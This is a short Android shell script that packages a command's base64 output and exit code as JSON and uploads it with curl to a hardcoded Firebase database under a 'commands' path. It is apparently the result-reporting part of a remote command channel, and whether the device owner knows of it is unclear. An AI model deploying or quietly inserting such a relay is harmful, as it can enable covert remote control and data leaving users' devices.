#!/system/bin/sh
KEY="$1"
CID="$2"
B64="$3"
RC="$4"
FB="https://khkh-38cba-default-rtdb.firebaseio.com"
printf '{"output":"%s","exit":%d,"status":"done"}' "$B64" "$RC" > /data/local/tmp/kabe_resp.json
curl -s --connect-timeout 5 -X PATCH -H "Content-Type: application/json" -d @/data/local/tmp/kabe_resp.json "$FB/kabe/$KEY/commands/$CID.json" >/dev/null 2>&1
rm -f /data/local/tmp/kabe_resp.json
